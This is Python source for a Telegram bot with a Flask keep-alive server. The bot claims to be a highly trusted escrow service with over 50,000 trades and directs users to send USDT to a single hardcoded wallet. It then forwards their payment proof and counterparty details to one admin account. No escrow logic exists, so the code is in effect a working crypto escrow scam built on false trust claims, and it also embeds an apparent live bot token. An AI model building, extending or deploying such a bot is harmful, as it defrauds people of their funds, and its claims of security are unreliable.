import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask

app = Flask(__name__)

@app.route('/')
def home():
    return "Mubarak ho! Escrow Bot 24/7 zinda hai!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

TOKEN = "8531797665:AAHziX3gFuQ3S6pq3Ua9noa_iLE1w5__pqo"
ADMIN_ID = "6327316551" 
DEPOSIT_ADDRESS = "THwDdNB5sb449DATzUjwyx9gEHXkS45ewc"

bot = telebot.TeleBot(TOKEN)
user_data = {} 

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        f"👋 Welcome, {message.from_user.first_name}!\n\n"
        "🛡 **Welcome to the Most Secure Escrow.** We hold funds safely for both buyers and sellers. "
        "Over 50,000 successful trades.\n\n"
        "Please choose an option below to proceed:"
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🤝 Create New Deal", callback_data="create_deal"))
    markup.add(InlineKeyboardButton("💰 Deposit Funds (Crypto)", callback_data="deposit"))
    markup.add(InlineKeyboardButton("❓ Rules & FAQ", callback_data="rules"))
    markup.add(InlineKeyboardButton("📞 Support", url="https://t.me/Scurepaymentescrow_Official"))
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "deposit":
        text = (
            f"💰 **Deposit Funds via Crypto (USDT/TRC20)**\n\n"
            f"Send your funds securely to the official deposit address below:\n\n"
            f"`{DEPOSIT_ADDRESS}`\n\n"
            f"⚠️ *Note:* Send only TRC20 tokens. After transferring, send the screenshot (Payment Proof) here."
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
        bot.edit_message_text(text=text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        
    elif call.data == "create_deal":
        bot.send_message(call.message.chat.id, "Please type /trade to start a secure deal.")
        
    elif call.data == "rules":
        rules_text = "📖 **Escrow Rules & Guidelines**\n\n1. Verify bot username.\n2. Funds locked until terms fulfilled.\n3. Contact support for disputes."
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
        bot.edit_message_text(text=rules_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "main_menu":
        start(call.message)

@bot.message_handler(commands=['trade'])
def trade_command(message):
    bot.send_message(message.chat.id, "🤝 Please send the Counterparty details (Username) and your Role:")
    bot.register_next_step_handler(message, process_trade_details)

def process_trade_details(message):
    user_data[message.chat.id] = {'counterparty_details': message.text}
    bot.send_message(message.chat.id, "✅ Details saved! Now please send the screenshot/document as proof of payment.")

@bot.message_handler(content_types=['photo', 'document'])
def handle_docs_photo(message):
    chat_id = message.chat.id
    user = message.from_user
    username = f"@{user.username}" if user.username else "No Username"
    user_id = user.id
    
    data = user_data.get(chat_id, {})
    counterparty = data.get('counterparty_details', 'Not Provided ❌')
    
    bot.send_message(chat_id, "✅ Your payment proof and details have been sent to the admin. Please wait for verification.")
    
    admin_notification = (
        f"🚨 *New Escrow Deal & Payment Proof!*\n\n"
        f"👤 *User:* {user.first_name} ({username})\n"
        f"🆔 *User ID:* {user_id}\n"
        f"🤝 *Counterparty Provided:* {counterparty}"
    )
    
    try:
        bot.send_message(ADMIN_ID, admin_notification, parse_mode='Markdown')
        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
    except Exception as e:
        bot.send_message(chat_id, "⚠️ Error sending to admin. Make sure you have started the bot from your admin account.")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    bot.send_message(message.chat.id, "Please type /trade to start a secure deal.")

if __name__ == '__main__':
    threading.Thread(target=run_web, daemon=True).start()
    print("Escrow Bot successfully running...")
    bot.infinity_polling()
      
